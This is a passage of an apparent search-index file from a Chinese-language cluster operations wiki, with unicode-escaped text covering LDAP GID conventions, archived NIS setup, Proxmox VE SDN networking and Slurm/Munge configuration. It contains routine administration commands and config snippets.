Syntaxes\uff09\u5b9a\u4e49\u4e86\u53ef\u4ee5\u5728\u76ee\u5f55\u670d\u52a1\u5668\u4e2d\u8868\u793a\u7684\u6570\u636e\u7c7b\u578b\u3002</li> <li>\u5339\u914d\u89c4\u5219\uff08Matching Rules\uff09\u5b9a\u4e49\u4e86\u53ef\u4ee5\u9488\u5bf9 LDAP \u6570\u636e\u6267\u884c\u7684\u6bd4\u8f83\u7c7b\u578b\u3002</li> <li>\u5c5e\u6027\u7c7b\u578b\uff08Attribute Types\uff09\u5b9a\u4e49\u4e86\u53ef\u80fd\u5b58\u50a8\u5728\u6761\u76ee\u4e2d\u7684\u5177\u540d\u4fe1\u606f\u5355\u5143\u3002</li> <li>\u5bf9\u8c61\u7c7b\uff08Object Classes\uff09\u5b9a\u4e49\u4e86\u5c5e\u6027\u7c7b\u578b\u7684\u547d\u540d\u96c6\u5408\uff0c\u53ef\u4ee5\u5728\u5305\u542b\u8be5\u7c7b\u7684\u6761\u76ee\u4e2d\u4f7f\u7528\uff0c\u4ee5\u53ca\u54ea\u4e9b\u5c5e\u6027\u7c7b\u578b\u662f\u5fc5\u9700\u7684\u800c\u4e0d\u662f\u53ef\u9009\u7684\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/ldap/#ldap-\u534f\u8bae","title":"LDAP \u534f\u8bae","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/ldap/#ldap-\u90e8\u7f72\u4e0e\u914d\u7f6e","title":"LDAP \u90e8\u7f72\u4e0e\u914d\u7f6e","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/ldap/#id-\u7ea6\u5b9a","title":"ID \u7ea6\u5b9a","text":"<p>\u56e0\u4e3a\u67d0\u4e9b\u670d\u52a1\u5728\u7cfb\u7edf\u65e9\u671f\u542f\u52a8\uff0c\u6b64\u65f6 SSSD \u670d\u52a1\u6682\u672a\u542f\u52a8\uff0c\u4f9d\u8d56\u4e8e <code>/etc</code> \u76ee\u5f55\u4e0b\u7684\u7528\u6237\uff08\u7ec4\uff09\u4fe1\u606f\u3002\u4e3a\u4e86\u9632\u6b62\u548c LDAP \u4e2d\u7684\u4fe1\u606f\u51b2\u7a81\u5bfc\u81f4\u95ee\u9898\uff0c\u9700\u8981\u5bf9\u9f50\u672c\u5730\u6587\u4ef6\u548c LDAP \u4e2d\u7684 ID \u5206\u914d\u3002</p> <p>Example</p> <p>\u6211\u4eec\u5728\u4f7f\u7528 Docker \u65f6\u9047\u5230\u4e86\u8fd9\u4e2a\u95ee\u9898\u3002<code>docker</code> \u7528\u6237\u7ec4\u5728\u5b89\u88c5\u65f6\u4f1a\u5206\u914d\u4e00\u4e2a GID\uff0c\u6bd4\u5982\u53ef\u80fd\u662f <code>996</code>\u3002\u8fd9\u4e0e\u6211\u4eec\u5728 LDAP \u4e2d\u4e3a <code>docker</code> \u7ec4\u8bbe\u5b9a\u7684 GID <code>700</code> \u4e0d\u4e00\u81f4\u3002</p> <p><code>docker.socket</code> \u5728 SSSD \u4e4b\u524d\u542f\u52a8\uff0c\u4e14\u65e0\u6cd5\u6539\u53d8\u8fd9\u4e00\u987a\u5e8f\uff0c\u56e0\u4e3a\u6709 <code>sssd.service</code> -&gt; <code>socket.target</code> -&gt; <code>docker.socket</code> \u8fd9\u6761\u4f9d\u8d56\u94fe\u3002<code>docker.socket</code> \u542f\u52a8\u65f6\u4f7f\u7528 <code>docker</code> \u7528\u6237\u7ec4\u521b\u5efa\u5957\u63a5\u5b57\uff0c\u6b64\u65f6\u521b\u5efa\u7684\u5957\u63a5\u5b57\u7684 GID \u662f <code>996</code>\u3002</p> <p>\u7b49 SSSD \u670d\u52a1\u542f\u52a8\uff0c\u6b64\u540e\u67e5\u8be2 <code>docker</code> \u7528\u6237\u7ec4\uff0c\u5f97\u5230\u7684 ID \u5c31\u90fd\u662f <code>700</code> \u4e86\uff0c\u4e0e\u5957\u63a5\u5b57\u4e0a\u7684 GID \u4e0d\u4e00\u81f4\uff0c\u89c6\u4e3a\u4e0d\u540c\u7528\u6237\u7ec4\u3002\u56e0\u6b64\u4f1a\u51fa\u73b0\u5373\u4f7f\u7528\u6237\u5728 <code>docker</code> \u7ec4\u91cc\uff0c\u4f7f\u7528 <code>docker</code> \u547d\u4ee4\u4ecd\u7136\u9047\u5230 <code>docker.sock: connect: permission denied</code> \u7684\u4ee4\u4eba\u56f0\u60d1\u7684\u95ee\u9898\u3002</p> <p>\u7528\u6237\u7ec4 GID \u5212\u5206\u5982\u4e0b\uff1a</p> \u8303\u56f4 \u63cf\u8ff0 <code>0-200, 900-999</code> \u4fdd\u7559\u7ed9\u672c\u5730\u6587\u4ef6 <code>/etc/group</code>\uff0c\u6b64\u8303\u56f4\u5916\u7684 GID \u90fd\u5728 LDAP \u4e2d <code>700-899</code> \u9700\u8981\u5728\u96c6\u7fa4\u4e2d\u7edf\u4e00\u7684\u8f6f\u4ef6\u7528\u6237\u7ec4\uff0c\u6bd4\u5982 <code>docker</code>\u3001<code>munge</code>\u3001<code>slurm</code> \u7b49 <code>1000-1999</code> \u7528\u6237\u5bf9\u5e94\u7684\u7528\u6237\u7ec4 <code>2000-2999</code> \u9879\u76ee\u5bf9\u5e94\u7684\u7528\u6237\u7ec4 <code>3000</code> \u5168\u4f53\u961f\u5458\u6240\u5c5e\u7528\u6237\u7ec4 <code>Teamers</code>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/nis/","title":"\u7f51\u7edc\u4fe1\u606f\u670d\u52a1\uff1aNIS","text":"","tags":["\u5f52\u6863"]},{"location":"operation/system/service/nis/#\u7f51\u7edc\u4fe1\u606f\u670d\u52a1nis","title":"\u7f51\u7edc\u4fe1\u606f\u670d\u52a1\uff1aNIS","text":"<p>Network Information Service</p> <p>archive</p> <p>\u88ab LDAP \u53d6\u4ee3\u3002</p> <p>Quote</p> <ul> <li>https://wiki.debian.org/BullseyeNis/</li> <li>https://webmin.com/docs/modules/nis-client-and-server/</li> </ul>","tags":["\u5f52\u6863"]},{"location":"operation/system/service/nis/#\u6982\u5ff5","title":"\u6982\u5ff5","text":"<p>NIS \u4f7f\u7528\u4e2d\u5fc3\u670d\u52a1\u5668\u7ba1\u7406\u7f51\u7edc\u4e2d\u6240\u6709\u4e3b\u673a\u7684\u8d26\u6237\u3001\u5bc6\u7801\u3001UID\u3001\u4e3b\u76ee\u5f55\u548c Shell \u7b49\u4fe1\u606f\uff0c\u63d0\u4f9b <code>/etc/passwd</code>\u00a0\u3001 <code>/etc/group</code>\u00a0\u548c <code>/etc/hosts</code>\u00a0\u7b49 ASCII \u6587\u4ef6\u4fe1\u606f\u3002\u8fd9\u4e9b\u4fe1\u606f\u5728\u670d\u52a1\u5668\u4e0a\u5b58\u50a8\u4e3a DBM \u6570\u636e\u5e93\u683c\u5f0f\uff0c\u6536\u5230\u8bf7\u6c42\u65f6\u8fdb\u884c\u67e5\u627e\u3002</p> <p>NIS \u4f7f\u7528 RPC \u534f\u8bae\u3002</p> <p>NIS \u4ee5\u524d\u88ab\u79f0\u4e3a\u9ec4\u9875\uff08Yellow Page\uff09\uff0c\u5728\u914d\u7f6e\u65f6\u4f60\u4f1a\u770b\u89c1 <code>yp</code> \u5c31\u662f\u5b83\u7684\u7f29\u5199\u3002\u8fd9\u4e9b\u4fe1\u606f\u4e5f\u88ab\u79f0\u4e3a\u6620\u5c04\uff08NIS map\uff09\u3002</p> <p>NIS \u73af\u5883\u4e2d\u6709\u4e3b/\u4ece\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u4e09\u79cd\u7c7b\u578b\u7684\u4e3b\u673a\uff0c\u4ece\u670d\u52a1\u5668\u7ef4\u62a4\u4e3b\u670d\u52a1\u5668\u7684\u6570\u636e\u5e93\u526f\u672c\uff0c\u53ef\u4ee5\u5b9e\u73b0\u9ad8\u53ef\u7528\u548c\u8d1f\u8f7d\u5747\u8861\u3002</p> <ul> <li>\u5e7f\u64ad\u65b9\u6cd5\uff1a\u5ba2\u6237\u7aef\u53d1\u9001\u5e7f\u64ad\uff0c\u7b2c\u4e00\u4e2a\u56de\u5e94\u7684\u88ab\u7ed1\u5b9a\u4e3a\u670d\u52a1\u5668\u3002</li> <li>\u6307\u5b9a\u670d\u52a1\u5668\u65b9\u6cd5\uff1a\u5ba2\u6237\u7aef\u7ef4\u62a4\u670d\u52a1\u5668\u5217\u8868\uff0c\u4f9d\u6b21\u5c1d\u8bd5\u3002</li> </ul>","tags":["\u5f52\u6863"]},{"location":"operation/system/service/nis/#linux-\u4e2d\u4e0e\u7528\u6237\u8d26\u6237\u76f8\u5173\u7684\u6587\u4ef6","title":"Linux \u4e2d\u4e0e\u7528\u6237\u8d26\u6237\u76f8\u5173\u7684\u6587\u4ef6","text":"<ul> <li><code>/etc/shadow</code>\u00a0\uff1a\u5b58\u653e\u52a0\u5bc6\u7684\u7528\u6237\u5bc6\u7801\uff0c\u53ea\u6709 <code>root</code>\u00a0\u53ef\u4ee5\u8bbf\u95ee\u3002</li> <li><code>/etc/passwd</code>\u00a0\uff1a\u7528\u6237\u4fe1\u606f</li> <li><code>/etc/group</code>\u00a0\uff1a\u7528\u6237\u7ec4\u4fe1\u606f</li> </ul>","tags":["\u5f52\u6863"]},{"location":"operation/system/service/nis/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<ul> <li><code>nis</code>\u00a0\u8f6f\u4ef6\u5305\u5305\u542b <code>rpcbind</code>\u3001<code>ypbind</code>\u00a0\u3001 <code>ypserv</code>\u00a0\u7b49\u6240\u9700\u7684\u8f6f\u4ef6\u5305\u3002</li> <li><code>libnss-nis</code></li> </ul>","tags":["\u5f52\u6863"]},{"location":"operation/system/service/nis/#\u4e3b\u670d\u52a1\u5668\u914d\u7f6e","title":"\u4e3b\u670d\u52a1\u5668\u914d\u7f6e","text":"<ul> <li>\u8bbe\u7f6e NIS \u57df\u540d\uff1a <code>/etc/defaultdomain</code></li> <li>\u4e3b\u4ece\u670d\u52a1\u5668\u4e0a\u90fd\u914d\u7f6e\u597d <code>/etc/hosts</code>\u00a0\uff0c\u5199\u5165\u6240\u6709\u5176\u4ed6\u670d\u52a1\u5668/\u5ba2\u6237\u7aef\u7684 IP \u5730\u5740\uff0c\u56e0\u4e3a NIS \u4e0d\u4f1a\u4f7f\u7528 DNS</li> </ul> <pre><code>172.25.2.x NAS00\n</code></pre> <ul> <li>\uff08\u5b89\u5168\u6027\uff0c\u53ef\u9009\uff09\u8bbe\u7f6e <code>/etc/ypserv.securenets</code>\u00a0\u548c <code>/etc/ypserv.conf</code>\u00a0\uff0c\u4f7f\u5f97 NIS \u670d\u52a1\u5668\u65e0\u6cd5\u88ab\u5916\u7f51\u8bbf\u95ee\u3002</li> <li>\u542f\u52a8\u670d\u52a1\uff1a<ul> <li><code>ypserv</code>\u00a0\u670d\u52a1\u5668</li> <li><code>yppasswdd</code>\u00a0\u5bc6\u7801</li> <li><code>ypxfrd</code>\u00a0\u4f20\u8f93\u6620\u5c04\u6570\u636e</li> </ul> </li> <li>NIS \u4f7f\u7528 <code>/var/yp/Makefile</code>\u00a0\u66f4\u65b0\u6620\u5c04\u3002</li> <li>\u542f\u7528\u5e7f\u64ad\u6a21\u5f0f\uff1a\u7ed9 <code>rpcbind</code>\u00a0\u5b88\u62a4\u8fdb\u7a0b\u6dfb\u52a0 <code>-r</code>\u00a0\u9009\u9879</li> </ul> <pre><code>echo \"OPTIONS=-w -r\" &gt;&gt;/etc/default/rpcbind\nsystemctl daemon-reload\n</code></pre>","tags":["\u5f52\u6863"]},{"location":"operation/system/service/nis/#\u5ba2\u6237\u7aef\u914d\u7f6e","title":"\u5ba2\u6237\u7aef\u914d\u7f6e","text":"<ul> <li>\u8bbe\u7f6e NIS \u57df\u540d</li> <li>\uff08\u53ef\u9009\uff09\u914d\u7f6e <code>/etc/yp.conf</code>\u00a0\uff1a\u6307\u5b9a NIS \u670d\u52a1\u5668</li> </ul> <pre><code>ypserver xxx.xxx.xxx.xxx\n</code></pre> <ul> <li>\u542f\u52a8 <code>ypbind</code>\u00a0\u670d\u52a1</li> <li>\u914d\u7f6e <code>/etc/nsswitch.conf</code>\u00a0\uff1a</li> </ul> <pre><code>passwd:   compat\ngroup:    compat\nshadow:   compat\nnetgroup: nis\n</code></pre> <ul> <li>\u914d\u7f6e <code>/etc/passwd</code>\u00a0\u3001<code>/etc/shadow</code>\u00a0\u3001 <code>/etc/group</code>\u00a0\uff1a\u5728\u672b\u5c3e\u52a0\u4e0a\u4e00\u884c</li> </ul> <pre><code># passwd\n+::::::\n# shadow\n+::::::::\n# group\n+:::\n</code></pre> <ul> <li>\uff08\u4e0d\u5efa\u8bae\uff09\u4e00\u822c\u5efa\u8bae\u7528 DNS \u67e5\u627e\u4e3b\u673a\u540d\u3002\u5982\u679c\u975e\u8981\u7528 NIS\uff0c\u53ef\u4ee5\u914d\u7f6e <code>/etc/nsswitch.conf</code>\u00a0\uff1a</li> </ul> <pre><code>hosts:  files nis\n</code></pre>","tags":["\u5f52\u6863"]},{"location":"operation/system/service/nis/#\u4ece\u670d\u52a1\u5668\u914d\u7f6e","title":"\u4ece\u670d\u52a1\u5668\u914d\u7f6e","text":"<ul> <li>\u5148\u6309\u5ba2\u6237\u7aef\u914d\u7f6e</li> <li>\u8bbe\u7f6e <code>/etc/hosts</code> \u3001\u5b89\u5168</li> <li>\u914d\u7f6e <code>/etc/default/nis</code> \uff1a</li> </ul> <pre><code>NISSERVER=slave\n</code></pre> <p>\u8be5\u6b65\u7591\u4f3c\u88ab\u5f03\u7528\uff1f\u9700\u9a8c\u8bc1 Again this is obsoleted by use of systemctl setup, and present there only for historical reasons and support the old sysv init script.</p> <ul> <li>\u914d\u7f6e\u4e3b\u670d\u52a1\u5668 <code>/var/yp/Makefile</code> \uff0c\u8ba9\u5b83\u77e5\u9053\u6709\u4ece\u670d\u52a1\u5668\uff1a</li> </ul> <pre><code>NOPUSH=\"false\"\n</code></pre> <ul> <li>\u5728\u4e3b\u670d\u52a1\u5668\u4e0a\u91cd\u5efa\u6620\u5c04\uff1a</li> </ul> <pre><code>/usr/lib/yp/ypinit -m\n</code></pre> <ul> <li>\u5728\u4ece\u670d\u52a1\u5668\u4e0a\u542f\u52a8\u670d\u52a1 <code>ypserv</code>\u00a0\uff0c\u5e76\u914d\u7f6e\u4e3b\u670d\u52a1\u5668\uff1a</li> </ul> <pre><code>systemctl enable ypserv.service\nsystemctl start ypserv.service\n/usr/lib/yp/ypinit -s &lt;name_of_your_master_nis_server_here&gt;\n</code></pre> <ul> <li>\uff08\u53ef\u9009\uff09\u914d\u7f6e\u5b9a\u65f6\u540c\u6b65\uff1a\u4e3b\u670d\u52a1\u5668\u66f4\u65b0\u65f6\u4f1a\u63a8\u9001\uff0c\u4f46\u82e5\u6b64\u65f6\u4ece\u670d\u52a1\u5668\u4e0d\u5728\u7ebf\uff0c\u5219\u53ef\u80fd\u9519\u8fc7\u63a8\u9001\u3002</li> </ul> <pre><code>systemctl enable ypxfr_1perday.timer\nsystemctl enable ypxfr_1perhour.timer\nsystemctl enable ypxfr_2perday.timer\nsystemctl start ypxfr_1perday.timer\nsystemctl start ypxfr_1perhour.timer\nsystemctl start ypxfr_2perday.timer\n</code></pre>","tags":["\u5f52\u6863"]},{"location":"operation/system/service/nis/#\u7ef4\u62a4","title":"\u7ef4\u62a4","text":"<p>\u5bf9\u7528\u6237\u8d26\u6237\u7684\u4fee\u6539\u90fd\u5728\u4e3b\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\uff0c\u4fee\u6539\u540e\u5728 <code>/var/yp</code>\u00a0\u8fd0\u884c <code>make</code>\u00a0\u4f7f\u66f4\u6539\u751f\u6548\u3002</p>","tags":["\u5f52\u6863"]},{"location":"operation/system/service/nis/#\u95ee\u9898\u89e3\u51b3","title":"\u95ee\u9898\u89e3\u51b3","text":"<ul> <li>\u5ba2\u6237\u7aef <code>ypserv</code>\u00a0\u542f\u52a8\u8fc7\u7a0b\u4e2d\u5361\u6b7b</li> </ul> <p>\u53ef\u80fd\u662f\u89e3\u6790\u4e0d\u51fa <code>/etc/yp.conf</code>\u00a0\u4e2d\u7684\u670d\u52a1\u5668\u5730\u5740\uff0c\u68c0\u67e5\u670d\u52a1\u5668\u3001\u7f51\u7edc\u662f\u5426\u6b63\u5e38\u3002</p>","tags":["\u5f52\u6863"]},{"location":"operation/system/service/pve/","title":"\u865a\u62df\u5316\u5e73\u53f0\uff1aPVE","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/pve/#\u865a\u62df\u5316\u5e73\u53f0pve","title":"\u865a\u62df\u5316\u5e73\u53f0\uff1aPVE","text":"<p>Proxmox Virtual Environment (PVE)</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/pve/#\u7f51\u7edc","title":"\u7f51\u7edc","text":"<p>\u81ea PVE 8 \u5f00\u59cb\uff0cPVE \u7684\u7f51\u7edc\u57fa\u4e8e SDN \u67b6\u6784\u3002\u81ea\u9876\u5411\u4e0b\u5212\u5206\u4e3a\uff1a</p> <ul> <li>zone\uff1a\u72ec\u7acb\u7684\u7f51\u7edc\u533a\u57df<ul> <li>\u5982\u679c\u9700\u8981\u5185\u7f6e DHCP \u7ba1\u7406\uff0c\u5e94\u5f53\u5728 Web \u754c\u9762\u521b\u5efa\u65f6\u52fe\u9009 Advanced \u9009\u62e9\u81ea\u52a8 DHCP\u3002</li> </ul> </li> <li>VNet\uff1a\u5f52\u5c5e\u4e8e zone<ul> <li>\u521b\u5efa VNet \u540e\uff0c\u5bf9\u5e94\u7684\u7f51\u7edc\u63a5\u53e3\u4f1a\u88ab\u6dfb\u52a0\u5230\u6240\u6709\u8282\u70b9\u4e0a</li> </ul> </li> <li>subnet\uff1aVNet \u4e2d\u7684 IP \u6bb5<ul> <li>subnet \u53ef\u4ee5\u8fdb\u884c\u8def\u7531\u3001\u6e90 NAT \u7b49\u914d\u7f6e</li> <li> <p>\u8bbe\u7f6e\u6e90 NAT \u540e\uff0cPVE \u4f1a\u5728 <code>/etc/network/interfaces.d</code> \u4e0b\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0 <code>post-up</code> \u548c <code>post-down</code> \u7684 iptables \u89c4\u5219\u3002</p> <p>\u4f46\u4ec5\u4ec5\u5728\u5bf9\u5e94\u63a5\u53e3\u914d\u7f6e SNAT \u5f80\u5f80\u662f\u4e0d\u591f\u7684\uff0c\u8fd8\u9700\u8981\u5141\u8bb8\u4ece\u63a5\u53e3\u5230 WAN \u7684\u53cc\u5411\u8f6c\u53d1\u3002\u6b64\u5916\uff0c\u5982\u679c\u9700\u8981\u4ece\u8282\u70b9\u5916\u8bbf\u95ee\uff0c\u8fd8\u9700\u8981\u5728\u5916\u90e8\u914d\u7f6e\u597d\u8def\u7531\u3002\u8bf7\u53c2\u8003 Linux \u7f51\u7edc#nftabls\u3002</p> </li> </ul> </li> </ul> <p>\u5176\u4ed6\u7ec4\u4ef6\u6709\uff1a</p> <ul> <li>IPAM\uff1aIP \u5730\u5740\u7ba1\u7406\u3002\u4e00\u822c\u4f7f\u7528\u5185\u7f6e\u7684 PVE IPAM Plugin\uff0c\u53ef\u4ee5\u914d\u7f6e\u5230\u591a\u4e2a zone\u3002</li> <li>dnsmasq DHCP Plugin\uff1a\u7528\u4e8e\u5728 zone \u4e2d\u63d0\u4f9b DHCP \u670d\u52a1\uff0c\u53ea\u8981\u7cfb\u7edf\u4e2d\u5b89\u88c5\u4e86 dnsmasq \u5373\u53ef\u3002<ul> <li>PVE \u81ea\u52a8\u5728 <code>/etc/dnsmasq.d/&lt;zone&gt;</code> \u4e0b\u521b\u5efa\u914d\u7f6e\u6587\u4ef6\uff0c\u9700\u8981\u5728 <code>/etc/dnsmasq.conf</code> \u4e2d\u5305\u542b\u8fd9\u4e2a\u76ee\u5f55\uff0c\u5982\u679c\u5df2\u6709\u81ea\u5b9a\u4e49\u914d\u7f6e\u6587\u4ef6\u9700\u8981\u6ce8\u610f\u51b2\u7a81\u3002</li> <li> <p>\u867d\u7136\u52fe\u9009\u7684\u662f\u201c\u81ea\u52a8 DHCP\u201c\uff0c\u4f46\u770b\u914d\u7f6e\u6587\u4ef6\u521b\u5efa\u7684\u662f static only \u7684\u914d\u7f6e\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u4f1a\u81ea\u52a8\u5206\u914d IP \u5730\u5740\uff0c\u53ea\u4f1a\u4e3a\u5df2\u77e5\u4e3b\u673a\u5206\u914d\u56fa\u5b9a IP\u3002\u53ef\u4ee5\u5728 IPAM \u9875\u9762\u6dfb\u52a0 DHCP Mapping\u3002</p> <p>Bug</p> <p>\u4f46\u662f\u73b0\u5728\u597d\u50cf\u6709 bug\uff0c\u6ca1\u6709\u5199\u5165\u5230 ether \u6587\u4ef6\u4e2d\u3002IPAM \u63d2\u4ef6\u4e2d\u76f8\u5173\u7684\u6e90\u7801\u5728 https://github.com/proxmox/pve-network/blob/e0e0f4fa869578558bfe8fdf19217f451852ae7f/src/PVE/Network/SDN/Dhcp/Dnsmasq.pm#L52C5-L52C20\uff0c\u5f85\u786e\u8ba4\u662f\u5426\u5f97\u5230\u6267\u884c\u3002</p> </li> </ul> </li> </ul> <p>\u5728 SDN \u9762\u677f\u4e0b\u8fdb\u884c\u7684\u914d\u7f6e\u4e0d\u4f1a\u7acb\u523b\u751f\u6548\uff0c\u786e\u8ba4\u65e0\u8bef\u540e\u56de\u5230 SDN \u6982\u89c8\u9875\u9762\u70b9\u51fb Apply \u624d\u4f1a\u751f\u6548\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/","title":"\u4efb\u52a1\u8c03\u5ea6\uff1aSlurm","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#\u4efb\u52a1\u8c03\u5ea6slurm","title":"\u4efb\u52a1\u8c03\u5ea6\uff1aSlurm","text":"<p>\u8f83\u65b0\u7248\u672c Slurm \u4e0e MPI \u6709\u517c\u5bb9\u6027\u95ee\u9898\u5c1a\u672a\u89e3\u51b3</p> <p>\u8bf7\u67e5\u770b Remove/revise Slurm launch integration - GitHub Issue\u3002</p> <p>\u9884\u8ba1\u95ee\u9898\u5728 Slurm 24.11 \u548c OpenMPI 6 \u4e2d\u89e3\u51b3\u3002\u76ee\u524d\uff0c\u6211\u4eec\u5c06\u96c6\u7fa4\u4e2d\u7684 Slurm \u7248\u672c\u56fa\u5b9a\u5728 22.05.11\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#slurm-\u539f\u7406","title":"Slurm \u539f\u7406","text":"<p>Quote</p> <ul> <li>Slurm batch queueing system - dtu.dk</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#\u57fa\u672c\u67b6\u6784","title":"\u57fa\u672c\u67b6\u6784","text":"Slurm \u67b6\u6784      Slurm <ul> <li>\u63a7\u5236\u8282\u70b9\u4e0a\u8fd0\u884c <code>slurmctld</code> \u5b88\u62a4\u8fdb\u7a0b\uff0c\u8d1f\u8d23\u63a5\u6536\u7528\u6237\u63d0\u4ea4\u7684\u4efb\u52a1\uff0c\u5206\u914d\u8d44\u6e90\uff0c\u76d1\u63a7\u4efb\u52a1\u8fd0\u884c\u72b6\u6001\u7b49\u3002</li> <li>\u8ba1\u7b97\u8282\u70b9\u4e0a\u8fd0\u884c <code>slurmd</code> \u5b88\u62a4\u8fdb\u7a0b\uff0c\u8d1f\u8d23\u63a5\u6536\u63a7\u5236\u8282\u70b9\u5206\u914d\u7684\u4efb\u52a1\uff0c\u6267\u884c\u4efb\u52a1\uff0c\u5c06\u4efb\u52a1\u7ed3\u679c\u8fd4\u56de\u7ed9\u63a7\u5236\u8282\u70b9\u3002</li> </ul>      Slurm \u5b9e\u4f53      Slurm <p>Slurm \u4e2d\u5305\u542b\u4ee5\u4e0b\u5b9e\u4f53\uff1a</p> <ul> <li>\u8282\u70b9\uff08node\uff09</li> <li>\u5206\u533a\uff08partition\uff09\uff1a\u7531\u8282\u70b9\u7ec4\u6210\u3002\u5206\u533a\u53ef\u4ee5\u89c6\u4e3a\u4efb\u52a1\u961f\u5217\u3002</li> <li>\u4efb\u52a1\uff08job\uff09\uff1a\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u6b65\u9aa4\uff08step\uff09\u7ec4\u6210\u3002</li> </ul> <p>Slurm \u8981\u6c42\u96c6\u7fa4\u4e0a\u6709\u4e00\u81f4\u7684\u7528\u6237\u540d\u548c\u7528\u6237\u7ec4\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#\u5176\u4ed6","title":"\u5176\u4ed6","text":"<p>Slurm \u8fd8\u63d0\u4f9b\u4e00\u4e2a PAM\uff0c\u80fd\u591f\u9650\u5236\u65e0\u4efb\u52a1\u7528\u6237\u767b\u5f55\u8282\u70b9\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#slurm-\u914d\u7f6e","title":"Slurm \u914d\u7f6e","text":"<p>\u914d\u7f6e\u6587\u4ef6\u901a\u8fc7 NFS \u6302\u8f7d</p> <p>Munge \u5bc6\u94a5\u548c Slurm \u914d\u7f6e\u6587\u4ef6\u7b49\u9700\u8981\u540c\u6b65\u5230\u96c6\u7fa4\u6bcf\u4e2a\u8282\u70b9\u3002\u56e0\u6b64\u6211\u4eec\u5728\u6839\u670d\u52a1\u5668\u521b\u5efa <code>/slurm</code> \u76ee\u5f55\uff0c\u8bbe\u7f6e\u4e3a\u53ea\u8bfb\u5171\u4eab\u5230\u96c6\u7fa4\u4e2d\u6240\u6709\u8282\u70b9\u3002</p> <p>\u56e0\u4e3a\u914d\u7f6e\u6587\u4ef6\u653e\u7f6e\u5728 NFS\uff0c\u6240\u4ee5\u9700\u8981\u4fee\u6539 Munge \u548c Slurm \u7b49\u670d\u52a1\u7684 <code>.service</code> \u6587\u4ef6\uff0c\u5c06 <code>EnvironmentFile</code> \u6307\u5411\u65b0\u7684\u5730\u65b9\uff0c\u5e76\u5728\u80fd\u591f\u4ece NFS \u52a0\u8f7d\u914d\u7f6e\u6587\u4ef6\u540e\u518d\u542f\u52a8\u670d\u52a1\u3002\u4ee5 <code>slurmd</code> \u4e3a\u4f8b\uff0c\u5173\u952e\u662f\u6dfb\u52a0 <code>remote-fs.target</code> \u7684\u4f9d\u8d56\uff0c\u4ee5\u53ca\u4f7f\u7528 <code>ConditionPathExists</code> \u6761\u4ef6\uff1a</p> /lib/systemd/system/slurmd.services<pre><code>[Unit]\nDescription=Slurm node daemon\nAfter=munge.service network-online.target remote-fs.target\nWants=network-online.target\nConditionPathExists=/slurm/etc/default/slurmd\n\n[Service]\nEnvironmentFile=-/slurm/etc/default/slurmd\n</code></pre> /slurm/etc/default/slurmd<pre><code># Additional options that are passed to the slurmd daemon\nSLURMD_OPTIONS=\"-vvvvvv\"\nSLURM_CONF=\"/slurm/etc/slurm/slurm.conf\"\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cSlurm \u76f8\u5173\u547d\u4ee4\u4e5f\u4ece\u73af\u5883\u53d8\u91cf <code>SLURM_CONF</code> \u4e2d\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff0c\u56e0\u6b64\u9700\u8981\u5728 <code>/etc/environment</code> \u4e2d\u6dfb\u52a0\uff1a</p> /etc/environment<pre><code>SLURM_CONF=\"/slurm/etc/slurm/slurm.conf\"\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#\u5b89\u88c5-munge","title":"\u5b89\u88c5 Munge","text":"<p>Quote</p> <ul> <li>Installation Guide - Spack</li> </ul> <p>Munge \u662f\u4e00\u4e2a\u52a0\u5bc6\u670d\u52a1\uff0c\u7528\u4e8e\u96c6\u7fa4\u4e2d\u76f8\u540c UID \u548c GID \u8fdb\u7a0b\u95f4\u7684\u8ba4\u8bc1\u3002</p> <p>\u96c6\u7fa4\u5728 SSSD \u4e0a\u4e3a Munge \u670d\u52a1\u521b\u5efa\u4e86\u4e00\u4e2a\u975e\u7279\u6743\u7684\u7528\u6237\u8d26\u6237 <code>munge</code>\u3002\u5e94\u5f53\u5728\u5b8c\u6210 SSSD \u914d\u7f6e\uff0c\u6b63\u786e\u8fd0\u884c\u540e\u518d\u5b89\u88c5 Munge\u3002</p> <p>Munge \u5bf9\u6743\u9650\u6781\u4e3a\u654f\u611f\uff0c\u5e94\u6309\u5b89\u88c5\u6307\u5bfc\u68c0\u67e5\u5404\u76ee\u5f55\u6743\u9650\uff1a</p> <ul> <li><code>/slurm/etc/munge</code>\uff1a0700</li> <li><code>/var/log/munge</code>\uff1a0700</li> </ul> <p>\u8fd9\u4e9b\u76ee\u5f55\u7684\u62e5\u6709\u8005\u4e3a\u8fd0\u884c\u5b88\u62a4\u8fdb\u7a0b\u7684\u7528\u6237\uff0c\u5373 <code>munge</code>\u3002</p> <pre><code>apt install munge\n</code></pre> <p>\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u8fd0\u884c Munge \u547d\u4ee4\u5747\u5e94\u4f7f\u7528 <code>munge</code> \u7528\u6237\uff0c\u5373 <code>sudo -u munge /usr/sbin/munged</code>\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/service/slurm/#\u914d\u7f6e-munge","title":"\u914d\u7f6e 